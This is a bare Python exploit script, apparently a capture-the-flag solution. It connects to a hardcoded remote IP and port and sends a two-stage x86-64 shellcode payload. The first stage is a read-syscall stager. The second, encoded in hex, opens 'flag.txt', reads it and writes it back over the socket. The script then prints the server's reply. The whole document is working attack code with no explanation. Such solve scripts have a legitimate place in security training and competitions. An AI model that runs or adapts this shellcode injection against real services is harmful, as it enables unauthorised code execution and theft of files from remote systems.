import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "165.22.100.192"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 32541

stage1 = bytes([0x50, 0x5E, 0x31, 0xC0, 0x0F, 0x05])
stage2 = bytes.fromhex(
    "488d3d3c00000031f631d2b8020000000f0589c7"
    "4881ec00020000488d3424ba0002000031c00f05"
    "89c2bf01000000488d3424b8010000000f0531ff"
    "b83c0000000f05666c61672e74787400"
)

payload = stage1 + b"\x90" * 6 + stage2

s = socket.create_connection((HOST, PORT), timeout=10)
s.settimeout(8)
print(s.recv(4096).decode(errors="replace"), end="")
s.sendall(payload)

out = b""
while True:
    try:
        c = s.recv(4096)
        if not c:
            break
        out += c
    except socket.timeout:
        break
print(out.decode(errors="replace"))
s.close()
